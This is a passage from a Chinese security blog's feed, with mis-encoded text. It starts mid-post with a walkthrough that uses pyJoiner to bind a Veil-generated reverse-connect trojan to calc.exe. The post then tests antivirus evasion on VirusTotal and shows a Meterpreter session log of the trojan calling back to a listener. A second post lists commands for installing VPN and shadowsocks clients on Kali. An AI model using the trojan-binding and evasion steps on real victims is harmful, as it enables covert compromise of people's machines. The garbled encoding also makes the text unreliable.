msfconsole  -r /var/lib/veil/output/handlers/test.rc</code></p></li></ul><h2 id="0x02-é…ç½®-pyJoinerâ€”GUI-Version-è¿è¡Œç¯å¢ƒ"><a href="#0x02-é…ç½®-pyJoinerâ€”GUI-Version-è¿è¡Œç¯å¢ƒ" class="headerlink" title="0x02 é…ç½® pyJoinerâ€”GUI-Version è¿è¡Œç¯å¢ƒ"></a>0x02 é…ç½® pyJoinerâ€”GUI-Version è¿è¡Œç¯å¢ƒ</h2><p>GitHub ä¸Šæœ‰ä¸¤ä¸ªç‰ˆæœ¬ <a href="https://github.com/danielhnmoreno" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a>  ï¼Œå…¶ä¸­ kali ç‰ˆå¿…é¡»ä½¿ç”¨ Kali Linux i386 ï¼Œæˆ‘çš„æ˜¯ x64 kali ï¼Œæ‰€ä»¥é€‰æ‹©äº† Windowsç‰ˆæœ¬çš„ pyJoinerâ€”GUI-Versionã€‚</p><p>æœ¬æ¬¡å®éªŒ pyJoiner è¿è¡Œç¯å¢ƒå¦‚ä¸‹ï¼š</p><ul><li>Windows 10 </li><li>Python 3.6.3 </li><li>pyinstaller 3.3.1</li></ul><h2 id="0x03-å°†ä¸¤ä¸ªexeæ–‡ä»¶è¿›è¡Œæ†ç»‘"><a href="#0x03-å°†ä¸¤ä¸ªexeæ–‡ä»¶è¿›è¡Œæ†ç»‘" class="headerlink" title="0x03 å°†ä¸¤ä¸ªexeæ–‡ä»¶è¿›è¡Œæ†ç»‘"></a>0x03 å°†ä¸¤ä¸ªexeæ–‡ä»¶è¿›è¡Œæ†ç»‘</h2><p>è¿™é‡Œæ†ç»‘çš„æ˜¯ calc.exe è¿™ä¸ªç¨‹åºï¼Œå°†å›è¿æœ¨é©¬ test.exe ä¸å…¶è¿›è¡Œæ†ç»‘ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><code>py -3 pyJoiner.py</code>         #åœ¨ pyJoiner ç›®å½•ä¸‹è¿è¡Œ CMD æ‰§è¡Œå‘½ä»¤ï¼Œåˆ‡è®°ä¸è¦å…³é—­CMD</p><p>æ‰“å¼€ GUI å¦‚ä¸‹å›¾ï¼š</p><p><img src="/uploads/10.jpg" alt="GUI"></p><p>å®éªŒä¸­ file1 é€‰æ‹©çš„ calc.exe ï¼Œfile2 é€‰æ‹©çš„å›è¿æœ¨é©¬test.exeï¼Œ é€‰æ‹©å¥½ä¹‹åç‚¹å‡» Join ã€‚</p><p>æ†ç»‘åç”Ÿæˆçš„ exe è·¯å¾„å¦‚ä¸‹ï¼š</p><p><img src="/uploads/12.jpg" alt="è·¯å¾„"></p><h2 id="0x04-å…æ€å›è¿æµ‹è¯•"><a href="#0x04-å…æ€å›è¿æµ‹è¯•" class="headerlink" title="0x04 å…æ€å›è¿æµ‹è¯•"></a>0x04 å…æ€å›è¿æµ‹è¯•</h2><p>ä½¿ç”¨åœ¨çº¿æŸ¥æ€å¼•æ“ virustotal çš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/uploads/13.jpg" alt="virustotal"></p><p>å›è¿æµ‹è¯•ï¼š</p><ul><li>ç›®æ ‡æœº Windows 10</li><li>åœ¨ç›®æ ‡æœºåŒå‡»æ†ç»‘åçš„æ–‡ä»¶ï¼Œæ‰“å¼€äº†æ†ç»‘çš„ file1 åº”ç”¨ç¨‹åºè®¡ç®—å™¨</li><li><img src="/uploads/14.jpg" alt="calc"></li><li>kali å›è¿ Meteoreter  session </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.youtube.com/watch?v=vHz8QU2Dj9M" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vHz8QU2Dj9M</a></p><p><a href="https://github.com/danielhnmoreno/pyJoiner---GUI-Version" target="_blank" rel="noopener">https://github.com/danielhnmoreno/pyJoiner---GUI-Version</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘åœ¨å­¦ä¹  veil çš„ Veil-Evasion æ¨¡å—ï¼Œå‘ç°ä¸€æ¬¾èƒ½æ†ç»‘ä¸¤ä¸ª exe æ–‡ä»¶çš„ pyJoiner å·¥å…·ï¼Œä¾¿æ‹¿æ¥å­¦ä¹ å­¦ä¹ ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="å…æ€" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="å…æ€" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="payloads" scheme="https://yaalonsong.github.io/tags/payloads/"/>
    
  </entry>
  
  <entry>
    <title>kaliå®‰è£…pptpå’Œshadowsockså®¢æˆ·ç«¯</title>
    <link href="https://yaalonsong.github.io/2018/03/06/kali%E5%AE%89%E8%A3%85pptp+shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html"/>
    <id>https://yaalonsong.github.io/2018/03/06/kaliå®‰è£…pptp+shadowsockså®¢æˆ·ç«¯.html</id>
    <published>2018-03-06T13:48:16.000Z</published>
    <updated>2018-08-22T17:17:38.350Z</updated>
    
    <content type="html"><![CDATA[<h4 id="kali-å®‰è£…-pptp-æ–¹æ³•"><a href="#kali-å®‰è£…-pptp-æ–¹æ³•" class="headerlink" title="kali å®‰è£… pptp æ–¹æ³•"></a>kali å®‰è£… pptp æ–¹æ³•</h4><h5 id="ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤"><a href="#ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤" class="headerlink" title="ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤"></a>ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</h5><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome</span><br><span class="line">#ä»¥ä¸Šä¸ºä¸€æ¡å‘½ä»¤æ¥æ‰§è¡Œ</span><br><span class="line">cp /etc/network/interfaces /etc/network/interfaces.backup </span><br><span class="line">echo &quot;auto lo &quot; &gt; /etc/network/interfaces </span><br><span class="line">echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces </span><br><span class="line">/etc/init.d/network-manager restart</span><br></pre></td></tr></table></figure><h4 id="kaliå®‰è£…sså®¢æˆ·ç«¯"><a href="#kaliå®‰è£…sså®¢æˆ·ç«¯" class="headerlink" title="kaliå®‰è£…sså®¢æˆ·ç«¯"></a>kaliå®‰è£…sså®¢æˆ·ç«¯</h4><h5 id="Command-line-Client"><a href="#Command-line-Client" class="headerlink" title="Command-line Client"></a>Command-line Client</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br><span class="line">apt-get install shadowsocks-libev</span><br><span class="line">cpan Net::Shadowsocks</span><br><span class="line">sslocal -s 23.154.235.12 -p 8388Â  -l 1080 -k password -t 600 -m aes-256-cfb</span><br></pre></td></tr></table></figure><p><em>æ³¨é‡Šï¼š-s æœåŠ¡å™¨IPï¼Œ-pä¸ºssé…ç½®çš„ç«¯å£ï¼Œ-l æœ¬åœ°ä»£ç†ç«¯å£ï¼Œ-kä¸ºssé…ç½®çš„å¯†ç </em></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;kali-å®‰è£…-pptp-æ–¹æ³•&quot;&gt;&lt;a href=&quot;#kali-å®‰è£…-pptp-æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;kali å®‰è£… pptp æ–¹æ³•&quot;&gt;&lt;/a&gt;kali å®‰è£… pptp æ–¹æ³•&lt;/h4&gt;&lt;h5 id=&quot;ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤&quot;&gt;&lt;a href=&quot;#ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤&quot; class=&quot;headerlink&quot; title=&quot;ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤&quot;&gt;&lt;/a&gt;ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤&lt;/h5&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="kali" scheme="https://yaalonsong.github.io/tags/kali/"/>
    
      <category term="pptp" scheme="https://yaalonsong.github.io/tags/pptp/"/>
    
      <category term="ss" scheme="https://yaalonsong.github.io/tags/ss/"/>
    
  </entry>
  
</feed>
